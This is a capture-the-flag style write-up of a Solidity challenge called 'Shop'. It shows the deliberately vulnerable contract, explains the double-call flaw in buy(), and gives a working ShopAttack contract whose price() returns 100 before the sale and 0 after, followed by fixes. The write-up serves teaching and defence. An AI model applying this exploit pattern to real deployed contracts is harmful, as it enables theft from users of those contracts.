# Level 21: Shop

## Goal

Buy the item from the shop for less than the asking price (make `price` end up below 100).

## The contract

```solidity
interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

## Vulnerability

`buy()` calls the buyer's `price()` **twice**:
1. In the `if` condition, to check `>= 100`.
2. Again to set `price = _buyer.price()`.

Between the two calls, `isSold` is flipped to `true`. A malicious buyer can return **different values** depending on `isSold` (it is only a `view` function, but `view` does not prevent it from reading changing state). Return 100 on the first call (passes the gate) and 0 on the second (sets price to 0).

## Exploit

```solidity
interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    IShop shop;
    constructor(address _shop) { shop = IShop(_shop); }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100; // 100 before sale, 0 after
    }

    function attack() external { shop.buy(); }
}
```

Deploy the attacker, then call `attack()`. The exploit must run **after** deployment (a call in the constructor would fail because the attacker has no runtime `price()` code yet). During `buy()`, the first `price()` returns 100 (gate passes), `isSold` becomes true, and the second `price()` returns 0.

## Fix

- Do not call an untrusted contract's function twice and assume the result is stable, especially across a state change you make in between.
- `view` guarantees no state is written by that function, but it can still **read** state that you just modified, so its return value can change. Cache the value once if you must trust it, or avoid trusting external return values for pricing.

## Takeaway

Like the Elevator level, this shows that an external `view` call is not a constant: read it once and reuse it, and never let an attacker-controlled contract answer the same question differently within one transaction.
